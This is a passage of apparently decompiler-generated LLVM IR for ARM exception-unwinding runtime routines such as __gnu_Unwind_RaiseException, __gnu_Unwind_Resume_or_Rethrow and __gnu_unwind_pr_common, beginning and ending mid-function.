  %v0_196cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_196cc, i32* @r5, align 4
  br i1 %v2_196c0, label %dec_label_pc_196d4, label %dec_label_pc_19710

dec_label_pc_196d4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_196e0 = add i32 %ucbp, 16
  %v2_196e0 = inttoptr i32 %v1_196e0 to i32*
  %v3_196e0 = load i32, i32* %v2_196e0, align 4
  call void @__pseudo_branch(i32 %v3_196e0)
  br i1 false, label %dec_label_pc_19708, label %dec_label_pc_196f4

dec_label_pc_196f4:                               ; preds = %dec_label_pc_196d4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_146d8.676 to i32))
  %v0_196fc = load i32, i32* @r4, align 4
  %v0_19700 = load i32, i32* @r5, align 4
  store i32 %v0_19700, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_196fc, i32 %v0_19700)
  br label %dec_label_pc_19708

dec_label_pc_19708:                               ; preds = %dec_label_pc_196d4, %dec_label_pc_196f4
  %v0_19708 = load i32, i32* @r5, align 4
  %v1_19708 = add i32 %v0_19708, 4
  %v1_1970c = inttoptr i32 %v1_19708 to i32*
  %v2_1970c = call i32 @__restore_core_regs(i32* %v1_1970c)
  %v1_19714.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_19710

dec_label_pc_19710:                               ; preds = %entry, %dec_label_pc_19708
  %v1_19714 = phi i32 [ %v0_196cc, %entry ], [ %v1_19714.pre, %dec_label_pc_19708 ]
  %v3_19714 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_19714, i32 1)
  %v0_19718 = call i32 @abort()
  ret i32 %v0_19718

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 7, 6, 2, 1, 4, 3, 8, 10, 5, 9, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 44, 45, 46, 47, 48, 50, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 29, 55, 59, 58, 57, 51, 52, 1, 36, 37, 30, 31, 32, 53, 54, 56, 38, 39, 49, 40, 33, 41, 24, 25, 0, 26, 27, 28, 34, 35, 42, 43, 2, 3, 4 }
  uselistorder i1 true, { 0, 1, 2, 3, 109, 145, 4, 146, 147, 148, 149, 5, 94, 128, 150, 6, 93, 151, 7, 92, 152, 153, 154, 155, 8, 156, 129, 9, 96, 157, 10, 95, 158, 159, 11, 160, 161, 162, 12, 163, 164, 13, 165, 14, 131, 166, 167, 130, 168, 169, 15, 97, 16, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 18, 99, 19, 180, 181, 182, 20, 98, 183, 21, 17, 184, 185, 22, 186, 187, 188, 23, 189, 190, 191, 192, 193, 24, 25, 132, 26, 27, 28, 29, 144, 100, 194, 195, 101, 196, 134, 197, 198, 31, 199, 200, 32, 102, 202, 30, 203, 201, 204, 133, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 106, 45, 46, 47, 48, 49, 116, 115, 50, 223, 91, 107, 113, 205, 114, 214, 206, 137, 207, 208, 51, 209, 52, 53, 210, 211, 108, 212, 213, 104, 215, 216, 217, 218, 219, 220, 54, 55, 221, 222, 136, 135, 66, 67, 68, 224, 69, 70, 117, 118, 123, 119, 124, 111, 122, 225, 112, 127, 226, 56, 227, 57, 58, 59, 228, 138, 139, 60, 61, 229, 140, 141, 62, 63, 230, 142, 143, 64, 65, 110, 231, 232, 125, 233, 71, 103, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 235, 236, 237, 238, 120, 239, 240, 241, 242, 243, 244, 245, 86, 87, 246, 88, 89, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 85, 262, 263, 264, 265, 266, 267, 84, 268, 105, 121, 126, 90, 269, 82, 83, 234, 270 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_19710, { 1, 0 }
  uselistorder label %dec_label_pc_19708, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1971c = load i32, i32* @r4, align 4
  store i32 %v3_1971c, i32* %stack_var_-16, align 4
  %v6_1971c = load i32, i32* @r5, align 4
  %v9_1971c = load i32, i32* @r6, align 4
  %v12_1971c = load i32, i32* @lr, align 4
  %v1_19720 = add i32 %entry_vrs, 60
  %v2_19720 = inttoptr i32 %v1_19720 to i32*
  %v3_19720 = load i32, i32* %v2_19720, align 4
  %v2_19724 = add i32 %entry_vrs, 64
  %v3_19724 = inttoptr i32 %v2_19724 to i32*
  store i32 %v3_19720, i32* %v3_19724, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_19754 = load i32, i32* %v3_19724, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1976c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19754)
  %v2_19770 = icmp eq i32 %v2_1976c, 0
  br i1 %v2_19770, label %dec_label_pc_19778, label %dec_label_pc_197ac

dec_label_pc_19778:                               ; preds = %entry
  %v0_19778 = load i32, i32* @r5, align 4
  %v1_19780 = add i32 %v0_19778, 16
  %v2_19780 = inttoptr i32 %v1_19780 to i32*
  %v3_19780 = load i32, i32* %v2_19780, align 4
  call void @__pseudo_branch(i32 %v3_19780)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_19798 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1979c = urem i32 %v2_19798, 2
  %v2_1979c = icmp eq i32 %v1_1979c, 0
  br i1 %v2_1979c, label %dec_label_pc_197bc, label %dec_label_pc_197a4

dec_label_pc_197a4:                               ; preds = %dec_label_pc_19778, %dec_label_pc_197bc
  %v0_197a4 = phi i1 [ false, %dec_label_pc_19778 ], [ %phitmp, %dec_label_pc_197bc ]
  br i1 %v0_197a4, label %dec_label_pc_197c8, label %dec_label_pc_197ac

dec_label_pc_197ac:                               ; preds = %entry, %dec_label_pc_197a4
  %v2_197b4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_197b4, i32* @r4, align 4
  store i32 %v6_1971c, i32* @r5, align 4
  store i32 %v9_1971c, i32* @r6, align 4
  store i32 %v12_1971c, i32* @lr, align 4
  ret i32 9

dec_label_pc_197bc:                               ; preds = %dec_label_pc_19778
  %v2_197bc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_197bc, i32* @r0, align 4
  %v1_197c0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_197bc)
  %v0_197a4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_197a4.pre, 6
  br label %dec_label_pc_197a4

dec_label_pc_197c8:                               ; preds = %dec_label_pc_197a4
  %v0_197c8 = load i32, i32* @r5, align 4
  %v0_197cc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_197c8, i32 %v0_197cc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_197ac, { 1, 0 }
  uselistorder label %dec_label_pc_197a4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_197d4 = add i32 %ucbp, 12
  %v2_197d4 = inttoptr i32 %v1_197d4 to i32*
  %v3_197d4 = load i32, i32* %v2_197d4, align 4
  %v2_197d8 = icmp eq i32 %v3_197d4, 0
  br i1 %v2_197d8, label %dec_label_pc_197e0, label %dec_label_pc_197e4

dec_label_pc_197e0:                               ; preds = %entry
  %v2_197e0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_197e4

dec_label_pc_197e4:                               ; preds = %entry, %dec_label_pc_197e0
  %v1_197e4 = add i32 %entry_vrs, 60
  %v2_197e4 = inttoptr i32 %v1_197e4 to i32*
  %v3_197e4 = load i32, i32* %v2_197e4, align 4
  %v2_197ec = add i32 %entry_vrs, 64
  %v3_197ec = inttoptr i32 %v2_197ec to i32*
  store i32 %v3_197e4, i32* %v3_197ec, align 4
  %v3_197f0 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_197f0

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_197e4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_19850

bb:                                               ; preds = %entry
  %v7_19808 = mul i32 %regclass, 4
  %v8_19808 = add i32 %v7_19808, ptrtoint (i32* @global_var_19810.829 to i32)
  call void @__pseudo_branch(i32 %v8_19808)
  br label %dec_label_pc_19850

dec_label_pc_19850:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_19938 = load i32, i32* @r4, align 4
  %v6_19938 = load i32, i32* @r5, align 4
  %v2_19948 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_19950 = add i32 %ucbp, 76
  %v2_19950 = inttoptr i32 %v1_19950 to i32*
  %v3_19950 = load i32, i32* %v2_19950, align 4
  %v1_1995c = inttoptr i32 %v3_19950 to i32*
  %v2_1995c = load i32, i32* %v1_1995c, align 4
  store i32 %v2_1995c, i32* @lr, align 4
  %v4_1995c = add i32 %v3_19950, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_19968 = urem i32 %state, 4
  store i32 %v1_19968, i32* %r2.global-to-local, align 4
  %v1_1996c = and i32 %state, 8
  store i32 %v1_1996c, i32* %r0.global-to-local, align 4
  %v4_1997c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1995c, i32* %v4_1997c, align 8
  br i1 %v2_19948, label %dec_label_pc_1998c, label %dec_label_pc_19c68

dec_label_pc_1998c:                               ; preds = %entry
  %v3_1998c = mul i32 %v2_1995c, 256
  store i32 %v3_1998c, i32* %v4_1997c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199a4

dec_label_pc_199a4:                               ; preds = %dec_label_pc_19c68, %dec_label_pc_1998c
  %v0_199c8647090 = phi i32 [ %v2_19c80, %dec_label_pc_19c68 ], [ %v4_1995c, %dec_label_pc_1998c ]
  store i32 %v1_19968, i32* %r2.global-to-local, align 4
  %v1_199a8 = add i32 %ucbp, 80
  %v2_199a8 = inttoptr i32 %v1_199a8 to i32*
  %v3_199a8 = load i32, i32* %v2_199a8, align 4
  %v7_199ac = icmp eq i32 %v1_19968, 2
  br i1 %v7_199ac, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_199a4
  %v2_199b0 = add i32 %ucbp, 56
  %v3_199b0 = inttoptr i32 %v2_199b0 to i32*
  %v4_199b0 = load i32, i32* %v3_199b0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_199a4, %bb
  %v0_199c86470 = phi i32 [ %v0_199c8647090, %dec_label_pc_199a4 ], [ %v4_199b0, %bb ]
  %v1_199b4 = urem i32 %v3_199a8, 2
  %v2_199b4 = icmp eq i32 %v1_199b4, 0
  br i1 %v2_199b4, label %dec_label_pc_199c8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_19a88

dec_label_pc_199c8.preheader:                     ; preds = %bb148
  %v1_199c86571 = inttoptr i32 %v0_199c86470 to i32*
  %v2_199c86672 = load i32, i32* %v1_199c86571, align 4
  %v2_199cc6874 = icmp eq i32 %v2_199c86672, 0
  br i1 %v2_199cc6874, label %dec_label_pc_19a88, label %dec_label_pc_199d4.preheader.lr.ph.lr.ph

dec_label_pc_199d4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_199c8.preheader
  %v7_199d8 = icmp eq i32 %id, 2
  %v2_19a64 = icmp eq i32 %v1_19968, 0
  %v2_19c30 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_19b4c = icmp eq i32 %v1_1996c, 0
  br label %dec_label_pc_199d4.preheader.lr.ph

dec_label_pc_199d4.preheader.lr.ph:               ; preds = %dec_label_pc_199d4.preheader.lr.ph.lr.ph, %dec_label_pc_19c9c
  %v1_199e496 = phi i32 [ %v2_199c86672, %dec_label_pc_199d4.preheader.lr.ph.lr.ph ], [ %v2_199c866, %dec_label_pc_19c9c ]
  %v1_199e093 = phi i32 [ %v0_199c86470, %dec_label_pc_199d4.preheader.lr.ph.lr.ph ], [ %v2_19ca0, %dec_label_pc_19c9c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_199d4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_19c9c ]
  br label %dec_label_pc_199d4.preheader

dec_label_pc_199d4.preheader:                     ; preds = %dec_label_pc_199d4.preheader.lr.ph, %dec_label_pc_19c60
  %v1_199e495 = phi i32 [ %v1_199e496, %dec_label_pc_199d4.preheader.lr.ph ], [ %v2_199c8, %dec_label_pc_19c60 ]
  %v1_199e092 = phi i32 [ %v1_199e093, %dec_label_pc_199d4.preheader.lr.ph ], [ %v1_19c60, %dec_label_pc_19c60 ]
  br label %dec_label_pc_199d4

dec_label_pc_199d4:                               ; preds = %dec_label_pc_199d4.preheader, %dec_label_pc_19a78
  %v1_199e4 = phi i32 [ %v1_199e495, %dec_label_pc_199d4.preheader ], [ %v2_19a7c, %dec_label_pc_19a78 ]
  %v1_199f8 = phi i32 [ %v1_199e092, %dec_label_pc_199d4.preheader ], [ %v1_19a78, %dec_label_pc_19a78 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_199d8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_199d4
  %v2_199dc = add i32 %v1_199f8, 4
  %v3_199dc = inttoptr i32 %v2_199dc to i32*
  %v4_199dc = load i32, i32* %v3_199dc, align 4
  store i32 %v4_199dc, i32* @r5, align 4
  store i32 %v1_199e4, i32* @r6, align 4
  %v0_199e8109 = load i32, i32* @r8, align 4
  %v1_199e8110 = add i32 %v0_199e8109, 72
  %v2_199e8111 = inttoptr i32 %v1_199e8110 to i32*
  %v3_199e8112 = load i32, i32* %v2_199e8111, align 4
  store i32 %v3_199e8112, i32* @lr, align 4
  %v2_199f4 = add i32 %v1_199f8, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_199d4
  %v2_199e0 = add i32 %v1_199f8, 2
  %v3_199e0 = inttoptr i32 %v2_199e0 to i16*
  %v4_199e0 = load i16, i16* %v3_199e0, align 2
  %v5_199e0 = zext i16 %v4_199e0 to i32
  store i32 %v5_199e0, i32* @r5, align 4
  %v0_199e8 = load i32, i32* @r8, align 4
  %v1_199e8 = add i32 %v0_199e8, 72
  %v2_199e8 = inttoptr i32 %v1_199e8 to i32*
  %v3_199e8 = load i32, i32* %v2_199e8, align 4
  store i32 %v3_199e8, i32* @lr, align 4
  %v2_199f0 = inttoptr i32 %v1_199f8 to i16*
  %v3_199f0 = load i16, i16* %v2_199f0, align 2
  %v4_199f0 = zext i16 %v3_199f0 to i32
  store i32 %v4_199f0, i32* @r6, align 4
  %v2_199f8 = add i32 %v1_199f8, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_199f8, %.thread16 ], [ %v2_199f4, %bb151 ]
  %v3_199e8115 = phi i32 [ %v3_199e8, %.thread16 ], [ %v3_199e8112, %bb151 ]
  %v0_19a00113 = phi i32 [ %v5_199e0, %.thread16 ], [ %v4_199dc, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_19a00 = and i32 %v0_19a00113, -2
  %v2_19a04 = add i32 %v1_19a00, %v3_199e8115
  store i32 %v2_19a04, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19a14 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19a14, i32* %r0.global-to-local, align 4
  %v5_19a20 = call i32 @_Unwind_VRS_Get(i32 %v0_19a14, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19a20, i32* %r0.global-to-local, align 4
  %v3_19a24 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_19a24, i32* %r2.global-to-local, align 4
  %v0_19a28 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_19a28, %v3_19a24
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_19a34

._crit_edge:                                      ; preds = %bb152
  %v0_19a4c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_19a34:                               ; preds = %bb152
  %v0_19a34 = load i32, i32* @r6, align 4
  %v1_19a34 = and i32 %v0_19a34, -2
  %v2_19a38 = add i32 %v1_19a34, %v0_19a28
  %v3_19a3c = icmp ult i32 %v3_19a24, %v2_19a38
  br i1 %v3_19a3c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_19a34
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_19a34
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_19a4c = phi i32 [ %v0_19a4c.pre, %._crit_edge ], [ %v0_19a34, %bb153 ], [ %v0_19a34, %.thread20 ]
  %v0_19bf4 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_19a48 = load i32, i32* @r5, align 4
  %v1_19a4c = urem i32 %v0_19a4c, 2
  %v1_19a48 = mul i32 %v0_19a48, 2
  %v3_19a50 = and i32 %v1_19a48, 2
  %v4_19a50 = or i32 %v3_19a50, %v1_19a4c
  store i32 %v4_19a50, i32* %r2.global-to-local, align 4
  %v7_19a54 = icmp eq i32 %v4_19a50, 1
  br i1 %v7_19a54, label %dec_label_pc_19be8, label %dec_label_pc_19a5c

dec_label_pc_19a5c:                               ; preds = %bb154
  %v2_19a54 = icmp eq i32 %v4_19a50, 0
  br i1 %v2_19a54, label %dec_label_pc_19a60, label %dec_label_pc_19b10

dec_label_pc_19a60:                               ; preds = %dec_label_pc_19a5c
  store i32 %v1_19968, i32* %r2.global-to-local, align 4
  br i1 %v2_19a64, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_19a60
  %v0_19a78119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_19a78

bb155:                                            ; preds = %dec_label_pc_19a60
  %v2_19a70 = icmp eq i32 %v0_19bf4, 0
  %v0_19a78 = load i32, i32* @r7, align 4
  br i1 %v2_19a70, label %dec_label_pc_19a78, label %dec_label_pc_19df0

dec_label_pc_19a78:                               ; preds = %.thread, %bb155
  %v0_19a78120 = phi i32 [ %v0_19a78119, %.thread ], [ %v0_19a78, %bb155 ]
  %v1_19a78 = add i32 %v0_19a78120, 4
  %v1_19a7c = inttoptr i32 %v1_19a78 to i32*
  %v2_19a7c = load i32, i32* %v1_19a7c, align 4
  %v2_19a80 = icmp eq i32 %v2_19a7c, 0
  br i1 %v2_19a80, label %dec_label_pc_19a88, label %dec_label_pc_199d4

dec_label_pc_19a88:                               ; preds = %dec_label_pc_19c9c, %dec_label_pc_19c60, %dec_label_pc_19a78, %dec_label_pc_199c8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_199c8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19a78 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19c60 ], [ %stack_var_-76.4, %dec_label_pc_19c9c ]
  %v0_19a88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19a88, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_19a90 = call i32 @__gnu_unwind_execute(i32 %v0_19a88, %anon_struct_13* %tmp156)
  store i32 %v4_19a90, i32* %r0.global-to-local, align 4
  store i32 %v4_19a90, i32* %r5.global-to-local, align 4
  %v2_19a94 = icmp eq i32 %v4_19a90, 0
  br i1 %v2_19a94, label %dec_label_pc_19a9c, label %dec_label_pc_19b18

dec_label_pc_19a9c:                               ; preds = %dec_label_pc_19a88
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_19aa0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_19aa0, label %bb157, label %dec_label_pc_19aac

bb157:                                            ; preds = %dec_label_pc_19a9c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19aac:                               ; preds = %dec_label_pc_19a9c
  %v2_19aac = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19aac, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19abc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19abc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_19ac4 = call i32 @_Unwind_VRS_Get(i32 %v0_19abc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_19ac8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_19abc, i32* %r0.global-to-local, align 4
  %v5_19adc = call i32 @_Unwind_VRS_Set(i32 %v0_19abc, i32 %v0_19ac8, i32 14, i32 %v0_19ac8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19adc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v4_19ae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 32) to i32*), align 4
  %v0_19aec = load i32, i32* %r5.global-to-local, align 4
  %v0_19af0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19af0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_19ae8, i32* %stack_var_-48, align 4
  %v5_19b04 = call i32 @_Unwind_VRS_Set(i32 %v0_19af0, i32 %v0_19aec, i32 15, i32 %v0_19aec, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19b10:                               ; preds = %dec_label_pc_19a5c
  %v7_19b10 = icmp eq i32 %v4_19a50, 2
  br i1 %v7_19b10, label %dec_label_pc_19b28, label %dec_label_pc_19b18

dec_label_pc_19b18:                               ; preds = %dec_label_pc_19b10, %dec_label_pc_19bfc, %dec_label_pc_19a88, %dec_label_pc_19df0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19b1c:                               ; preds = %bb157, %dec_label_pc_19e28, %dec_label_pc_19db8, %bb166, %dec_label_pc_19aac, %dec_label_pc_19b18
  %v1_19b24 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19e28 ], [ %v1_19b24.pre, %dec_label_pc_19db8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_19aac ], [ 9, %dec_label_pc_19b18 ]
  store i32 %v3_19938, i32* %r4.global-to-local, align 4
  store i32 %v6_19938, i32* %r5.global-to-local, align 4
  ret i32 %v1_19b24

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19b10
  store i32 %v1_19968, i32* %r2.global-to-local, align 4
  %v0_19b2c = load i32, i32* @r7, align 4
  %v1_19b2c = inttoptr i32 %v0_19b2c to i32*
  %v2_19b2c = load i32, i32* %v1_19b2c, align 4
  %tmp206 = bitcast i32 %v2_19b2c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_19b34 = bitcast float %tmp207 to i32
  store i32 %v1_19b34, i32* @sl, align 4
  br i1 %v2_19a64, label %dec_label_pc_19b3c, label %dec_label_pc_19ca8

dec_label_pc_19b3c:                               ; preds = %dec_label_pc_19b28
  %v2_19b3c = icmp eq i32 %v0_19bf4, 0
  br i1 %v2_19b3c, label %dec_label_pc_19c90, label %dec_label_pc_19b44

dec_label_pc_19b44:                               ; preds = %dec_label_pc_19b3c
  %v2_19b48 = icmp eq i32 %v1_19b34, 0
  br i1 %v2_19b48, label %dec_label_pc_19b54.thread, label %bb159

dec_label_pc_19b54.thread:                        ; preds = %dec_label_pc_19b44
  br label %dec_label_pc_19db8

bb159:                                            ; preds = %dec_label_pc_19b44
  br i1 %v3_19b4c, label %dec_label_pc_19b5c, label %dec_label_pc_19c90

dec_label_pc_19b5c:                               ; preds = %bb159
  %v1_19b5c = add i32 %v0_19b2c, 4
  store i32 %v1_19b5c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_19b6c = load i32, i32* @r8, align 4
  %v1_19b6c = add i32 %v0_19b6c, 88
  store i32 %v1_19b6c, i32* %sb.global-to-local, align 4
  store i32 %v1_19b5c, i32* @r4, align 4
  br label %dec_label_pc_19b90

dec_label_pc_19b80:                               ; preds = %bb161
  %v1_19b80 = add i32 %v0_19b80, 1
  store i32 %v1_19b80, i32* @r5, align 4
  %v1_19b84 = load i32, i32* @sl, align 4
  %v9_19b84 = icmp eq i32 %v1_19b80, %v1_19b84
  %v0_19b88 = load i32, i32* @r4, align 4
  %v1_19b88 = add i32 %v0_19b88, 4
  store i32 %v1_19b88, i32* @r4, align 4
  br i1 %v9_19b84, label %dec_label_pc_19db8, label %dec_label_pc_19b80.dec_label_pc_19b90_crit_edge

dec_label_pc_19b80.dec_label_pc_19b90_crit_edge:  ; preds = %dec_label_pc_19b80
  %v0_19b9c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19b90

dec_label_pc_19b90:                               ; preds = %dec_label_pc_19b80.dec_label_pc_19b90_crit_edge, %dec_label_pc_19b5c
  %v0_19b9c = phi i32 [ %v0_19b9c.pre, %dec_label_pc_19b80.dec_label_pc_19b90_crit_edge ], [ %v1_19b6c, %dec_label_pc_19b5c ]
  %v1_19ba0 = phi i32 [ %v1_19b88, %dec_label_pc_19b80.dec_label_pc_19b90_crit_edge ], [ %v1_19b5c, %dec_label_pc_19b5c ]
  %v1_19b90 = inttoptr i32 %v1_19ba0 to i32*
  %v2_19b90 = load i32, i32* %v1_19b90, align 4
  %v2_19b94 = icmp eq i32 %v2_19b90, 0
  store i32 %v0_19b9c, i32* %forced_unwind_-44, align 4
  br i1 %v2_19b94, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_19b90
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_19b90, %bb160
  %v0_19ba4 = load i32, i32* @r8, align 4
  store i32 %v0_19ba4, i32* %r0.global-to-local, align 4
  store i32 %v2_19c30, i32* %r2.global-to-local, align 4
  %v4_19bb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 100) to i32*), align 4
  store i32 105408, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19bb4)
  %v0_19bc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_19bc0 = icmp eq i32 %v0_19bc0, 0
  %v0_19b80 = load i32, i32* @r5, align 4
  br i1 %v2_19bc0, label %dec_label_pc_19b80, label %dec_label_pc_19bc8

dec_label_pc_19bc8:                               ; preds = %bb161
  %v1_19bc8 = load i32, i32* @sl, align 4
  %v9_19bc8 = icmp eq i32 %v0_19b80, %v1_19bc8
  br i1 %v9_19bc8, label %dec_label_pc_19db8, label %dec_label_pc_19bd0

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19bc8
  %v0_19bd0 = load i32, i32* @r7, align 4
  %v1_19bd0 = inttoptr i32 %v0_19bd0 to i32*
  %v2_19bd0 = load i32, i32* %v1_19bd0, align 4
  %v1_19bd4 = icmp slt i32 %v2_19bd0, 0
  %v0_19bdc.pre = load i32, i32* @r6, align 4
  br i1 %v1_19bd4, label %dec_label_pc_19bdc, label %dec_label_pc_19c9c

dec_label_pc_19bdc:                               ; preds = %dec_label_pc_19bd0, %dec_label_pc_19c94
  %v0_19bdc = phi i32 [ %storemerge, %dec_label_pc_19c94 ], [ %v0_19bdc.pre, %dec_label_pc_19bd0 ]
  store i32 %v0_19bdc, i32* %r0.global-to-local, align 4
  %v1_19be0 = add i32 %v0_19bdc, 4
  store i32 %v1_19be0, i32* @r6, align 4
  br label %dec_label_pc_19c9c

dec_label_pc_19be8:                               ; preds = %bb154
  store i32 %v1_19968, i32* %r2.global-to-local, align 4
  br i1 %v2_19a64, label %dec_label_pc_19bf4, label %dec_label_pc_19ce0

